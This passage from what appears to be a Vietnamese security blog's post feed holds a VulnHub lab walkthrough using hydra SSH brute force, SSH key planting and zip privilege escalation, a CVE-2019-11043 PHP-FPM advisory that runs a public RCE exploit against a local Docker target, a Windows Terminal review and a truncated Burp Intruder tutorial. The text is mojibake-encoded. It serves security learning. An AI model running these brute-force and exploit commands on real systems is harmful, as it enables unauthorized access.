n√†o\nLet\u0026rsquo;s go Recon Scan m·∫°ng 1 ph√°t xem b√†i lab c·ªßa m√¨nh ƒëang ch·∫°y ·ªü ip n√†o.\nL·∫ßn n√†y m√¨nh d√πng Netdiscover scan cho nhanh. Tool n√†y c√≥ s·∫µn tr√™n Kali, Ubuntu th√¨ c·∫ßn ph·∫£i c√†i th√™m, c≈©ng r·∫•t d·ªÖ c√†i th√¥i ^^.\n1 2 3 4 5 6 7  Currently scanning: 192.168.41.0/16 | Screen View: Unique Hosts 52 Captured ARP Req/Rep packets, from 36 hosts. Total size: 3120 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.19.110 00:0c:29:22:66:8b 1 60 VMware, Inc.   Qu√©t ra ƒë∆∞·ª£c ip v·ªõi MAC Address tr√πng kh·ªõp v·ªõi c√°i m√°y ·∫£o c·ªßa m√¨nh r·ªìi. V√†o th·ª≠ xem web c√≥ g√¨ kh√¥ng n√†o.\nC≈©ng ch·∫≥ng c√≥ g√¨ trong n√†y c·∫£, c√≥ m·ªói qu·∫£ template kh√° ƒë·∫πp :scream:, loanh quanh 1 h·ªìi th·ª≠ s·ª≠ d·ª•ng Gobuster m√† b·∫°n Nghƒ©a ƒë√£ chia s·∫ª ·ªü ƒë√¢y xem c√≥ g√¨ gi·∫•u gi·∫•u trong web n√†y kh√¥ng.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ‚ûú ~ gobuster dir -u http://192.168.19.110 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -l 10 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.19.110 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Extensions: php [+] Timeout: 10s =============================================================== 2019/12/07 15:09:50 Starting gobuster =============================================================== /images (Status: 301) [Size: 317] /assets (Status: 301) [Size: 317] /server-status (Status: 403) [Size: 279] =============================================================== 2019/12/07 15:17:12 Finished ===============================================================   C≈©ng ch·∫≥ng c√≥ g√¨ ·ªü ƒë√¢y c·∫£, th·ª≠ qu√©t nmap xem c√≥ c√≤n d·ªãch v·ª• n√†o ƒëang ch·∫°y tr√™n server n√†y kh√¥ng.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ‚ûú ~ nmap -p- -A 192.168.19.110 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 15:14 +07 Nmap scan report for 192.168.19.110 Host is up (0.0031s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HA: Dhanush 65345/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e3:2f:3d:dd:ac:42:d4:d5:de:ec:9b:19:0b:45:3e:13 (RSA) | 256 89:02:8d:a5:e0:75:a5:34:3b:52:3a:6c:d1:f4:05:da (ECDSA) |_ 256 ea:af:62:07:73:d0:d5:1e:fb:a9:12:62:34:27:52:d9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds   ·ªû ƒë√¢y ch√∫ng ta c√≥ th·ªÉ th·∫•y r·∫±ng server n√†y ch·ªâ ch·∫°y c√≥ 2 d·ªãch v·ª• l√† d·ªãch v·ª• web (Apache httpd 2.4.29) ·ªü c·ªïng 80 v√† ssh ·ªü c·ªïng 65345 Sao ssh b√¨nh th∆∞·ªùng m·ªü c·ªïng 22 m√† ·ªü ƒë√¢y m·ªü ·ªü c·ªïng 65345 l√†m g√¨ nh·ªâ, ƒëi·ªÅu n√†y l√†m m√¨nh t·∫≠p trung v√†o ph·∫ßn d·ªãch v·ª• ssh n√†y h∆°n so v·ªõi d·ªãch v·ª• web.\nAttack C≈©ng ch·∫≥ng c√≥ nhi·ªÅu th√¥ng tin g√¨ v·ªÅ d·ªãch v·ª• ssh n√†y, th√¥i th√¨ d√πng Hydra bruteforce th·ª≠ xem th·∫ø n√†o. V·∫´n nh∆∞ c√°c b√†i lab kh√°c, ·ªü Kali c√≥ tool cewl d√πng ƒë·ªÉ ƒë·ªçc d·ªØ li·ªáu c·ªßa trang web, r·ªìi tr·∫£ v·ªÅ 1 danh s√°ch c√°c t·ª´ xu·∫•t hi·ªán trong website ƒë√≥ ƒë·ªÉ l√†m wordlist :joy:\n1 2 3  ‚ûú ~ cewl 192.168.19.110 \u0026gt; pass.txt ‚ûú ~ wc -l pass.txt 115 pass.txt   Th·ª≠ nh√©t v√†o Hydra xem sao\n1 2 3 4 5 6 7 8  ‚ûú ~ hydra -L pass.txt -P pass.txt 192.168.19.110 ssh -s 65345 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-07 15:30:04 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 13225 login tries (l:115/p:115), ~827 tries per task [DATA] attacking ssh://192.168.19.110:65345/ [STATUS] 152.07 tries/min, 2281 tries in 00:15h, 10949 to do in 01:13h, 16 active   Ch·∫°y l√¢u th·∫≠t s·ª±, kh√¥ng kh·∫£ thi t√Ω n√†o. Gi·ªù m√¨nh ph·∫£i bi·∫øt ƒë∆∞·ª£c user ƒë·ªÉ ƒëƒÉng nh·∫≠p ssh, m·ªü l·∫°i website th√¨ th·∫•y ƒë∆∞·ª£c t√™n c·ªßa 3 c√¢y cung. Th·ª≠ l·∫•y t√™n 3 c√¢y cung ƒë·∫•y l√†m username xem sao. V·∫≠y ta s·∫Ω c√≥\n1 2 3 4  ‚ûú ~ cat user.txt sharang pinak gandiv   (Ban ƒë·∫ßu c√≤n ng√°o ng√°o ƒë·ªÉ c·∫£ t√™n vi·∫øt hoa c∆° :joy::joy:) Correct!\nTh·ª≠ ƒëƒÉng nh·∫≠p v√†o xem c√≥ g√¨ kh√¥ng n√†o ƒê√∫ng l√† nh∆∞ m√¨nh d·ª± ƒëo√°n, c√≥ 3 users ƒë·∫•y th·∫≠t :joy::joy:\nUser pinak c√≥ th·ªÉ s·ª≠ d·ª•ng l·ªánh cp v·ªõi user sarang\nK·ªãch b·∫£n s·∫Ω l√† nh∆∞ th·∫ø n√†y, gi·ªù m√¨nh ph·∫£i generate kh√≥a ssh-key, r·ªìi copy kh√≥a n√†y v√†o th∆∞ m·ª•c .ssh c·ªßa user sarang, l√∫c ƒë·∫•y m√¨nh s·∫Ω ƒëƒÉng nh·∫≠p v·ªõi user sarang b·∫±ng c√°i kh√≥a m√† m√¨nh copy v√†o. V·∫≠y l√† ta c√≥ th·ªÉ ƒëƒÉng nh·∫≠p ƒë∆∞·ª£c v√†o sarang\n1 2 3  pinak@ubuntu:~/.ssh$ chmod 777 id_rsa.pub pinak@ubuntu:~/.ssh$ sudo -u sarang cp id_rsa.pub /home/sarang/.ssh/authorized_keys cp: cannot stat \u0026#39;id_rsa.pub\u0026#39;: Permission denied   Loay hoay m√£i k hi·ªÉu t·∫°i sao l·∫°i Permission denied. H√≥a ra l√† ph·∫£i copy c√°i file id_rsa.pub ra ngo√†i folder .ssh r·ªìi m·ªõi th·ª±c hi·ªán copy ƒë∆∞·ª£c.\nCorrect!\nB√¢y gi·ªù m√¨nh c√≥ th·ªÉ s·ª≠ d·ª•ng kh√≥a n√†y ƒë·ªÉ ƒëƒÉng nh·∫≠p v·ªõi quy·ªÅn l√† c·ªßa sarang r·ªìi.\nPrivilege Escalation Search google 1 h·ªìi ra b√†i n√†y Linux for Pentester : ZIP Privilege Escalation . L√†m theo th√¥i :D\nCorrect!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  root@ubuntu:/root# cat flag.txt @p @@@. @@@@@ @@@@@@@ *\u0026#34;`]@P ^^ ]@P ]@P ,,,, ]@P ,,gg,, g@@@@@@@@@b ]@P ,@@@@@@@@@@g, ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w g@@@@P^` %NNNNN@NNNNNP *B@@@g g@@@P` -@ \u0026#34;B@@w ,@@@` ]@ %@@, @@P- ]@ *@@, ,@@\u0026#34; ]@ *B@ ,@N\u0026#34; y@@B %@, ,, g@P- ]@@@P *Bg ,gg @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN\u0026#34; !! Congrats you have finished this task !!\tContact us here:\tHacking Articles : https://twitter.com/rajchandel/\tNisha Sharma : https://in.linkedin.com/in/nishasharmaa\t+-+-+-+-+-+ +-+-+-+-+-+-+-+\t|E|n|j|o|y| |H|A|C|K|I|N|G|\t+-+-+-+-+-+ +-+-+-+-+-+-+-+\t____________________________________ root@ubuntu:/root#   End C·∫£m ∆°n 1 b√†i labs kh√° l√† hay c·ªßa Hacking Articles : https://twitter.com/rajchandel/. M√¨nh ƒë√£ h·ªçc ƒë∆∞·ª£c nhi·ªÅu ƒëi·ªÅu ·ªü ƒë√¢y, c√≤n c√°c b·∫°n th√¨ sao, cho m√¨nh 1 upvote v√† 1 comment nh√© ^^.\n","permalink":"https://minhtuanact.ml/posts/ha-dhanush-zip-privilege-escalation-1-bai-labs-thu-nghiem-nang-cao-dac-quyen-kha-hay-cua-hacking-articles/","summary":"Gi·ªõi thi·ªáu H√¥m nay tr·ªùi kh√° l√† l·∫°nh, h√¨nh nh∆∞ l√† l·∫°nh nh·∫•t t·ª´ l√∫c m√πa ƒë√¥ng gh√© qua th·ªß ƒë√¥ H√† N·ªôi. S√°ng qu·∫•n chƒÉn ƒë·∫øn 7h s√°ng m·ªõi d·∫≠y. D·∫≠y ch∆°i v√†i t·ª±a game 8-bit ng√†y x∆∞a kh√° l√† k·ª∑ ni·ªám. L√¢u r·ªìi c≈©ng kh√¥ng build b√†i lab n√†o l√™n l√†m th·ª≠. Th·ª≠ t·∫£i 1 b√†i v·ªÅ ch∆°i xem sao. L·∫ßn n√†y v·∫´n l√† b√†i tr√™n https://www.vulnhub.com/. Ch·ªçn ng·∫´u nhi√™n 1 b√†i th·ª≠ xem tr√¨nh ƒë·ªô m√¨nh ƒë·∫øn ƒë√¢u :joy::joy::joy:","title":"HA: Dhanush (ZIP Privilege Escalation), 1 b√†i labs th·ª≠ nghi·ªám n√¢ng cao ƒë·∫∑c quy·ªÅn kh√° hay c·ªßa Hacking Articles"},{"content":"B·∫°n ƒë√£ quen g√µ Terminal tr√™n Ubuntu hay c√°c b·∫£n ph√¢n ph·ªëi kh√°c c·ªßa Linux. B·∫°n ch√™ Windows kh√¥ng c√≥ c∆° ch·∫ø d√≤ng l·ªánh \u0026ldquo;x·ªãn x√≤\u0026rdquo; nh∆∞ Linux. Hay b·∫°n ch·ªâ l√† nh·ªØng ng∆∞·ªùi \u0026ldquo;ƒëam m√™\u0026rdquo; nh·ªØng d√≤ng l·ªánh tr√™n Linux th√¥i nh∆∞ng b·∫°n ƒëang th·∫•t v·ªçng v√¨ Windows kh√¥ng c√≥. Nh∆∞ng b·∫°n h√£y th·ª≠ xem video n√†y xem Windows ƒë√£ v√† ƒëang l√†m ƒë∆∞·ª£c nh·ªØng g√¨ nh√©. {@youtube: https://www.youtube.com/watch?v=8gw0rXPMMPE} ƒê·∫πp ƒë√∫ng kh√¥ng ·∫°, b·∫°n c√≥ th·ªÉ m·ªü Windows 10 l√™n v√† nh·∫•p v√†o link store Windows Terminal ƒë·ªÉ t·∫£i v·ªÅ v√† d√πng th·ª≠.\n Th·ª±c ra m√¨nh ƒë·ªãnh vi·∫øt b√†i n√†y t·ª´ cu·ªëi th√°ng 6 khi ·ª©ng d·ª•ng m·ªõi ph√°t h√†nh ·ªü b·∫£n preview, nh∆∞ng drop ƒë·∫øn t·∫≠n b√¢y gi·ªù m·ªõi vi·∫øt :sweat_smile:. C·∫£m th·∫•y c√≥ l·ªói qu√° :(\n C√†i ƒë·∫∑t Do b·∫£n Windows Terminal (Preview) n√†y ƒëang ho·∫°t ƒë·ªông t·ªët tr√™n n·ªÅn Windows 10 1903 n√™n c√°c b·∫°n c·ªë g·∫Øng ki·ªÉm tra xem Windows 10 c·ªßa b·∫°n ƒëang ·ªü b·∫£n 1903 tr·ªü l√™n kh√¥ng nh√©.\nC√°c b·∫°n c√≥ th·ªÉ v√†o link Windows Terminal (Preview) ho·∫∑c c√°c b·∫°n c√≥ th·ªÉ m·ªü Microsoft Store l√™n v√† t√¨m ki·∫øm Windows Terminal r·ªìi b·∫•m Install l√† ƒë∆∞·ª£c :D\nPhi√™n b·∫£n hi·ªán t·∫°i c·ªßa m√¨nh ƒëang d√πng l√† Version: 0.6.2951.0. C√°c b·∫°n th·ª≠ ki·ªÉm tra phi√™n b·∫£n xem c√≥ ƒë√∫ng kh√¥ng nh√©.\nCh·ª©c nƒÉng V·∫≠y c√°i ·ª©ng d·ª•ng n√†y th√¨ l√†m ƒë∆∞·ª£c g√¨ nh·ªâ :thinking:. Theo nh∆∞ Microsoft c√¥ng b·ªë th√¨ ·ª©ng d·ª•ng n√†y s·∫Ω l√† 1 d·∫°ng ·ª©ng d·ª•ng t·∫•t-c·∫£-trong-m·ªôt. T·ª´ ƒë√¢y ng∆∞·ªùi d√πng s·∫Ω truy c·∫≠p ƒë∆∞·ª£c cmd truy·ªÅn th·ªëng c·ªßa Windows, hay l√† Powershell. ƒêi·ªÅu ƒë·∫∑c bi·ªát nh·∫•t l√† n√≥ ch·∫°y c·∫£ h·ªá th·ªëng Windows Subsystem for Linux (WSL) d√πng ƒë·ªÉ ch·∫°y Terminal c·ªßa Linux tr√™n Windows. V√¢ng t√¥i kh√¥ng l·ª´a c√°c b·∫°n ƒë√¢u. Ch·∫°y Linux tr√™n Windows ƒë√≥.\nC√°c b·∫°n c√≥ th·ªÉ xem c√°ch c√†i ƒë·∫∑t Windows Subsystem for Linux (WSL) t·∫°i ƒë√¢y https://docs.microsoft.com/en-us/windows/wsl/install-win10.\nC√≥ r·∫•t nhi·ªÅu c√°c distribution Linux ·ªü ƒë√¢y. B·∫°n c√≥ th·ªÉ tha h·ªì ch·ªçn l·ª±a r·ªìi Install v√†o m√°y m√¨nh th√¥i.\nS·ª≠ d·ª•ng B·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc documents ·ª©ng d·ª•ng t·∫°i ƒë√¢y https://github.com/microsoft/terminal/blob/master/doc/user-docs/index.md\n·ª®ng d·ª•ng Windows Terminal c√≥ kh·∫£ nƒÉng cho ph√©p duy·ªát nhi·ªÅu tab, ƒë·ªÉ ng∆∞·ªùi d√πng c√≥ th·ªÉ th·ª±c thi nhi·ªÅu d√≤ng l·ªánh ·ªü c√πng 1 th·ªùi ƒëi·ªÉm. Microsoft c≈©ng cung c·∫•p kh·∫£ nƒÉng tu·ª≥ bi·∫øn kh√° cao ƒë·ªëi v·ªõi giao di·ªán c·ªßa ·ª©ng d·ª•ng n√†y. V√† m·ªôt s·ªë t√≠nh nƒÉng c√° nh√¢n ho√° tu·ª≥ v√†o ng∆∞·ªùi d√πng th√≠ch s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o. Tuy nhi√™n l√† do phi√™n b·∫£n ƒë·∫ßu ti√™n ch∆∞a ƒë·∫ßy ƒë·ªß t√≠nh nƒÉng n√™n ng∆∞·ªùi d√πng ph·∫£i c·∫•u h√¨nh qua file JSON :joy: ·ª®ng d·ª•ng Windows Terminal c√≤n h·ªó tr·ª£ k·∫øt xu·∫•t vƒÉn b·∫£n b·∫±ng b·ªô x·ª≠ l√Ω ƒë·ªì ho·∫° (GPU), cho ph√©p ng∆∞·ªùi d√πng ch√®n emoji.\n·ªû ƒë√¢y m√¨nh ƒë√£ c√†i Ubuntu v√†o m√°y c·ªßa m√¨nh r·ªìi, v√† m√¨nh ch·∫≥ng th·∫•y tr·ªü ng·∫°i n√†o gi·ªØa Windows v√† Linux c·∫£. Tuy·ªát nhi√™n l√† n√≥ kh√¥ng c√≥ m·ªói giao di·ªán UI/UX th√¥i, ch·ªâ c√≥ Terminal n√™n kh·ªüi ƒë·ªông c·ª±c k·ª≥ nhanh. Ph·∫£n h·ªìi ngay l·∫≠p t·ª©c. C√≥ c√°c n√∫t shortcut chuy·ªÉn ƒë·ªïi qua l·∫°i gi·ªØa c√°c ·ª©ng d·ª•ng r·∫•t ti·ªán.\nM√¨nh th·∫•y c·∫£ Azure Cloud Shell, t·ª©c l√† b·∫°n c√≥ th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp ƒë·∫øn server Azure qua ·ª©ng d·ª•ng n√†y. Ti·∫øc l√† m√¨nh kh√¥ng c√≥ server Azure ƒë·ªÉ tr·∫£i nghi·ªám tr√™n ·ª©ng d·ª•ng n√†y xem n√≥ m∆∞·ª£t m√† nh∆∞ th·∫ø n√†o. Hi v·ªçng l·∫ßn sau m√¨nh s·∫Ω c√≥ c∆° h·ªôi ƒë∆∞·ª£c tr·∫£i nghi·ªám.\nK·∫øt Hi v·ªçng c√°c b·∫°n th√≠ch th√∫ v·ªõi ki·ªÉu g√µ cmd m·ªõi n√†y c·ªßa Windows 10. Ch√∫c c√°c b·∫°n vui v·∫ª v√† h√†i l√≤ng v·ªõi ·ª©ng d·ª•ng Windows Terminal c·ªßa Microsoft.\n√Ä hi·ªán t·∫°i v·∫´n ƒëang l√† phi√™n b·∫£n Preview n√™n ch·∫Øc kh√¥ng th·ªÉ tr√°nh ƒë∆∞·ª£c l·ªói, c√°c b·∫°n c·ª© d√πng th·ª≠ r·ªìi ch·ªù phi√™n b·∫£n Offical nh√©.\nTham kh·∫£o http://genk.vn/microsoft-chinh-thuc-ra-mat-ung-dung-dong-lenh-windows-terminal-moi-danh-cho-windows-10-20190623143320827.chn https://github.com/microsoft/terminal/blob/master/doc/user-docs/index.md\n","permalink":"https://minhtuanact.ml/posts/go-terminal-tren-windows-10-tai-sao-khong/","summary":"B·∫°n ƒë√£ quen g√µ Terminal tr√™n Ubuntu hay c√°c b·∫£n ph√¢n ph·ªëi kh√°c c·ªßa Linux. B·∫°n ch√™ Windows kh√¥ng c√≥ c∆° ch·∫ø d√≤ng l·ªánh \u0026ldquo;x·ªãn x√≤\u0026rdquo; nh∆∞ Linux. Hay b·∫°n ch·ªâ l√† nh·ªØng ng∆∞·ªùi \u0026ldquo;ƒëam m√™\u0026rdquo; nh·ªØng d√≤ng l·ªánh tr√™n Linux th√¥i nh∆∞ng b·∫°n ƒëang th·∫•t v·ªçng v√¨ Windows kh√¥ng c√≥. Nh∆∞ng b·∫°n h√£y th·ª≠ xem video n√†y xem Windows ƒë√£ v√† ƒëang l√†m ƒë∆∞·ª£c nh·ªØng g√¨ nh√©. {@youtube: https://www.youtube.com/watch?v=8gw0rXPMMPE} ƒê·∫πp ƒë√∫ng kh√¥ng ·∫°, b·∫°n c√≥ th·ªÉ m·ªü Windows 10 l√™n v√† nh·∫•p v√†o link store Windows Terminal ƒë·ªÉ t·∫£i v·ªÅ v√† d√πng th·ª≠.","title":"G√µ Terminal tr√™n Windows 10. T·∫°i sao kh√¥ng?"},{"content":"M·ªôt l·ªó h·ªïng ƒë∆∞·ª£c b√°o c√°o g·∫ßn ƒë√¢y, c√≥ m√£ l√† CVE-2019-11043, c√≥ th·ªÉ ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c trang web s·ª≠ d·ª•ng PHP-FPM ƒë·ªÉ th·ª±c thi c√°c trang PHP. Vi·ªác s·ª≠ d·ª•ng PHP-FPM ƒë·∫∑c bi·ªát ph·ªï bi·∫øn t·∫°i c√°c trang web s·ª≠ d·ª•ng NGINX v√¨ NGINX kh√¥ng c√≥ th·ªùi gian ch·∫°y PHP trong ti·∫øn tr√¨nh. Thay v√†o ƒë√≥, NGINX ho·∫°t ƒë·ªông nh∆∞ m·ªôt Reverse Proxy cho c√°c m√°y ch·ªß ·ª©ng d·ª•ng v√† tr√¨nh qu·∫£n l√Ω ti·∫øn tr√¨nh nh∆∞ PHP-FPM.\nL·ªó h·ªïng n√†y n·∫±m ·ªü ch√≠nh PHP-FPM ch·ª© k ph·∫£i l√† NGINX. V√¨ v·∫≠y c√°ch gi·∫£i quy·∫øt ƒë∆°n gi·∫£n v√† ƒë·∫£m b·∫£o hi·ªáu qu·∫£ l√† n√¢ng c·∫•p b·∫£n v√° ho·∫∑c c·∫≠p nh·∫≠t version PHP l√™n PHP 7.1.33, PHP 7.2.24 ho·∫∑c PHP 7.3.11.\nB·∫£n ch·∫•t c·ªßa l·ªó h·ªïng NGINX giao ti·∫øp v·ªõi PHP-FPM b·∫±ng giao th·ª©c FastCGI. M·ªói th√¥ng b√°o FastCGI ch·ª©a m·ªôt t·∫≠p h·ª£p c√°c bi·∫øn m√¥i tr∆∞·ªùng. M·ªôt trong s·ªë n√†y, PATH_INFO ƒë∆∞·ª£c l·∫•y t·ª´ c√°c request parameters. N·∫øu gi√° tr·ªã c·ªßa n√≥ ƒë·ªôt nhi√™n \u0026ldquo;empty\u0026rdquo;, n√≥ c√≥ th·ªÉ g√¢y ra h·ªèng b·ªô nh·ªõ trong PHP-FPM binary. C√≥ th·ªÉ khai th√°c l·ªói n√†y v√† l√†m cho PHP-FPM binary ch·∫°y c√°c l·ªánh t√πy √Ω tr√™n local server.\nL·ªó h·ªïng n√†y ƒë∆∞·ª£c k√≠ch ho·∫°t b·ªüi m·ªôt c·∫•u h√¨nh NGINX ƒë∆∞·ª£c m·ªçi ng∆∞·ªùi hay d√πng, theo ƒë√≥, NGINX s·ª≠ d·ª•ng m·ªôt regex ch·ªâ ƒë·ªãnh fastcgi_split_path_info t√°ch URI theo y√™u c·∫ßu th√†nh 2 ph·∫ßn. M·ªôt c√°ch ƒë·ªÉ k√≠ch ho·∫°t l·ªó h·ªïng n√†y l√† nh√∫ng k√Ω t·ª± ng·∫Øt d√≤ng (%0a) ho·∫∑c k√Ω t·ª± (%0d) v√†o request URI, sau ƒë√≥ n√≥ kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω theo ki·ªÉu b√¨nh th∆∞·ªùng :v:\nNh·ªØng website n√†o c√≥ th·ªÉ b·ªã ·∫£nh h∆∞·ªüng Hi·ªán t·∫°i nh·ªØng trang web c√≥ c√°c server NGINX ch·∫°y c√°c phi√™n b·∫£n PHP 7 tr·ªü l√™n c√≥ th·ªÉ b·ªã ·∫£nh h∆∞·ªüng. L·ªói underflow PHP-FPM c≈©ng c√≥ th·ªÉ b·ªã ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c phi√™n b·∫£n PHP tr·ªü v·ªÅ tr∆∞·ªõc.\nM·ªôt website c√≥ th·ªÉ d√≠nh l·ªó h·ªïng n√†y n·∫øu website ƒë∆∞·ª£c c·∫•u h√¨nh nh∆∞ sau:\n NGINX ƒë∆∞·ª£c config chuy·ªÉn ti·∫øp y√™u c·∫ßu c·ªßa c√°c trang PHP ƒë·∫øn PHP-FPM ƒë·ªÉ x·ª≠ l√Ω. fastcgi_split_path_info ƒë∆∞·ª£c s·ª≠ d·ª•ng trong t·ªáp c·∫•u h√¨nh v√† s·ª≠ d·ª•ng regex ƒë∆∞·ª£c b·∫Øt ƒë·∫ßu b·∫±ng \u0026ldquo;^\u0026rdquo; v√† k·∫øt th√∫c b·∫±ng \u0026ldquo;$\u0026rdquo; Bi·∫øn PATH_INFO ƒë∆∞·ª£c s·ª≠ d·ª•ng v·ªõi fastcgi_param directive.  X·ª≠ l√Ω:  Upgrade l√™n phi√™n b·∫£n PHP m·ªõi h∆°n. N·∫øu b·∫°n kh√¥ng th·ªÉ upgrade version PHP ngay l·∫≠p t·ª©c, th√¨ c√≥ m·ªôt t√πy ch·ªçn ƒë·ªÉ gi·∫£m thi·ªÉu m·ªôt ph·∫ßn m√† b·∫°n c√≥ th·ªÉ th·ª±c hi·ªán   Th√™m try_files $uri = 404; v√†o file config c·ªßa NGINX.\n  S·ª≠ d·ª•ng ModSecurity ƒë·ªÉ ch·∫∑n c√°c y√™u c·∫ßu c√≥ ch·ª©a %0a ho·∫∑c %0d\nSecRule REQUEST_URI \u0026quot;@rx %0(a|A|d|D)\u0026quot; \u0026quot;id:1,phase:1,t:lowercase,deny\u0026quot;\n    Th·ª±c h√†nh ·ªû ƒë√¢y m√¨nh ƒë√£ t√¨m th·∫•y m·ªôt PoC c√≥ build docker ƒë·ªÉ m√¨nh c√≥ th·ªÉ th·ª±c h√†nh v·ªõi l·ªó h·ªïng m·ªõi n√†y.\nhttps://github.com/theMiddleBlue/CVE-2019-11043\nC√°c b∆∞·ªõc th·ª±c hi·ªán. 1 2 3  git clone https://github.com/theMiddleBlue/CVE-2019-11043.git cd CVE-2019-11043 docker-compose up -d   (n·∫øu docker-compose up -d b·ªã l·ªói th√¨ b·∫°n n√™n ki·ªÉm tra l·∫°i t·ªáp docker-compose.yml xem ƒë√£ c·∫•u h√¨nh ƒë√∫ng ch∆∞a)\nN·∫øu b·∫°n l√™n ƒë∆∞·ª£c nh∆∞ n√†y th√¨ l√† th√†nh c√¥ng r·ªìi. Ti·∫øp t·ª•c th·ª≠ nghi·ªám t·∫•n c√¥ng.\n1  python exploit.py --url https://localhost:3000/index.php   B·∫°n c√≥ th·ªÉ ƒë·ªçc logs PHP-FPM b·∫±ng l·ªánh:\n1  docker logs --tail 10 --follow php   1 2 3 4 5 6  [*] QSL candidate: 1752, 1757, 1762 [*] Target seems vulnerable (QSL:1752/HVL:233): PHPSESSID=e917394e3b139d62fe86807e7f918f50; path=/ [*] RCE successfully exploited! You should be able to run commands using: curl http://localhost:3000/index.php?a=bin/ls+/   Bingo. V·∫≠y l√† b·∫°n ƒë√£ c√≥ th·ªÉ remote server r·ªìi.\nTham kh·∫£o  https://www.nginx.com/blog/php-fpm-cve-2019-11043-vulnerability-nginx/ https://github.com/theMiddleBlue/CVE-2019-11043 https://paper.seebug.org/1064/  ","permalink":"https://minhtuanact.ml/posts/lo-hong-php-fpm-cve-2019-11043-voi-may-chu-nginx-khien-nhieu-trang-web-bi-anh-huong/","summary":"M·ªôt l·ªó h·ªïng ƒë∆∞·ª£c b√°o c√°o g·∫ßn ƒë√¢y, c√≥ m√£ l√† CVE-2019-11043, c√≥ th·ªÉ ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c trang web s·ª≠ d·ª•ng PHP-FPM ƒë·ªÉ th·ª±c thi c√°c trang PHP. Vi·ªác s·ª≠ d·ª•ng PHP-FPM ƒë·∫∑c bi·ªát ph·ªï bi·∫øn t·∫°i c√°c trang web s·ª≠ d·ª•ng NGINX v√¨ NGINX kh√¥ng c√≥ th·ªùi gian ch·∫°y PHP trong ti·∫øn tr√¨nh. Thay v√†o ƒë√≥, NGINX ho·∫°t ƒë·ªông nh∆∞ m·ªôt Reverse Proxy cho c√°c m√°y ch·ªß ·ª©ng d·ª•ng v√† tr√¨nh qu·∫£n l√Ω ti·∫øn tr√¨nh nh∆∞ PHP-FPM.","title":"L·ªó h·ªïng PHP-FPM (CVE-2019-11043) v·ªõi m√°y ch·ªß NGINX khi·∫øn nhi·ªÅu trang web b·ªã ·∫£nh h∆∞·ªüng"},{"content":"Burp Intruder  Ti·∫øp t·ª•c cho ph·∫ßn 1 ƒë∆∞·ª£c vi·∫øt t·∫°i ƒë√¢y, m√¨nh s·∫Ω gi·ªõi thi·ªáu ti·∫øp cho c√°c b·∫°n c√°ch s·ª≠ d·ª•ng tab Options v√† c√°ch t·∫•n c√¥ng sao cho hi·ªáu qu·∫£ nh·∫•t khi s·ª≠ d·ª•ng Burp Intruder  C·∫•u h√¨nh cu·ªôc t·∫•n c√¥ng Options Attack Options  T·∫°i ƒë√¢y, sau khi b·∫°n ƒë√£ g·∫Øn Positions, truy·ªÅn Payloads th√¨ b·∫°n c≈©ng c√≥ th·ªÉ t·∫•n c√¥ng ƒë∆∞·ª£c r·ªìi. Nh∆∞ng t·∫•n c√¥ng sao cho hi·ªáu qu·∫£ th√¨ tab Options n√†y kh√° quan tr·ªçng, n√≥ c√≥ r·∫•t nhi·ªÅu t√πy ch·ªçn d√πng ƒë·ªÉ t·∫•n c√¥ng nh∆∞ request headers, the request engine, attack results, grep match, grep extract, grep payloads, v√† redirections.  Attack Request Headers  Th∆∞·ªùng th√¨ ph·∫ßn n√†y kh√¥ng ƒë∆∞·ª£c s·ª≠ d·ª•ng nhi·ªÅu trong c√°c cu·ªôc t·∫•n c√¥ng, nh∆∞ng c·∫ßn thi·∫øt th√¨ v·∫´n d√πng th√¥i =)). T√πy ch·ªçn n√†y s·∫Ω ki·ªÉm so√°t Intruder c√≥ c·∫≠p nh·∫≠t c√°c headers ƒë∆∞·ª£c c·∫•u h√¨nh trong cu·ªôc t·∫•n c√¥ng hay kh√¥ng. Nh∆∞ng b·∫°n c√≥ to√†n quy·ªÅn ki·ªÉm so√°t c√°c request template trong tab Payload Positions.  Request Engine T√πy ch·ªçn n√†y c√≥ l·∫Ω l√† t√πy ch·ªçn m√† m√¨nh th√≠ch nh·∫•t. C√†i ƒë·∫∑t n√†y ki·ªÉm so√°t ƒë∆∞·ª£c c√°c y√™u c·∫ßu HTTP trong cu·ªôc t·∫•n c√¥ng s·ª≠ d·ª•ng Intruder. C√≥ r·∫•t nhi·ªÅu t√πy 